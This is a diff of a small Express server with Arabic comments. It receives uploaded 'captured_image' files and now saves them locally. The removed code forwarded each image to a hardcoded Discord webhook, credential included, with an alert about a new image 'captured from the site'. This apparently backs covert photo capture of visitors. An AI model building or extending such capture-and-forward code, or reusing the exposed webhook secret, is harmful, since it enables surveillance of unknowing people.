@@ -1,50 +1,52 @@
 const express = require('express');
 const multer = require('multer');
-const axios = require('axios');
-const FormData = require('form-data');
-const fs = require('fs');
+const path = require('path');
 const cors = require('cors');
+const fs = require('fs');
 
 const app = express();
+
+// تعيين المنفذ ديناميكياً ليناسب بيئات الاستضافة السحابية أو 3000 محلياً
+const PORT = process.env.PORT || 3000;
+
+// تفعيل CORS للسماح لصفحة الـ HTML بإرسال البيانات للسيرفر
 app.use(cors());
 
-const upload = multer({ dest: 'uploads/' });
+// التأكد من وجود مجلد uploads، وإذا لم يكن موجوداً يتم إنشاؤه تلقائياً
+const uploadDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir);
+}
 
-// رابط الـ Webhook الخاص بك جاهز وصحيح هنا
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525465698317373540/iGdJxuIPPgFXaxss4xXOlJuEnsvZ1cR5ZG';
+// إعداد ملتر (Multer) لتسمية وحفظ الصور المرفوعة
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, uploadDir);
+    },
+    filename: (req, file, cb) => {
+        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+        cb(null, 'snap-' + uniqueSuffix + path.extname(file.originalname));
+    }
+});
 
-app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
+const upload = multer({ storage: storage });
+
+// --- الواجهة الرئيسية الجديدة ---
+app.get('/', (req, res) => {
+    res.send('<h1 style="text-align: center; margin-top: 50px; font-family: sans-serif;">مرحباً بك</h1>');
+});
+
+// الرابط (API) المسؤول عن استقبال الصورة وحفظها
+app.post('/api/upload', upload.single('captured_image'), (req, res) => {
     if (!req.file) {
         return res.status(400).json({ error: 'لم يتم استقبال أي صورة' });
     }
-
-    try {
-        const discordData = new FormData();
-        discordData.append('file', fs.createReadStream(req.file.path), req.file.originalname || 'instant_snap.jpg');
-        discordData.append('content', '🚨 **تم التقاط صورة جديدة من الموقع!**');
-
-        await axios.post(DISCORD_WEBHOOK_URL, discordData, {
-            headers: discordData.getHeaders(),
-        });
-
-        // مسح الصورة محلياً من السيرفر للحفاظ على المساحة
-        fs.unlinkSync(req.file.path);
-
-        return res.status(200).json({ message: 'تم إرسال الصورة إلى ديسكورد بنجاح' });
-    } catch (error) {
-        console.error('خطأ أثناء إرسال الصورة:', error.message);
-        if (fs.existsSync(req.file.path)) {
-            fs.unlinkSync(req.file.path);
-        }
-        return res.status(500).json({ error: 'فشل إرسال الصورة إلى ديسكورد' });
-    }
+    console.log(`📸 تم استقبال صورة بنجاح وحفظها باسم: ${req.file.filename}`);
+    
+    res.status(200).json({ message: 'تم حفظ الصورة بنجاح!' });
 });
 
-app.get('/', (req, res) => {
-    res.send('السيرفر يعمل بنجاح وجاهز لاستقبال الصور!');
-});
-
-const PORT = process.env.PORT || 3000;
+// تشغيل السيرفر
 app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+    console.log(`🚀 السيرفر يعمل الآن بنجاح على المنفذ: ${PORT}`);
 });
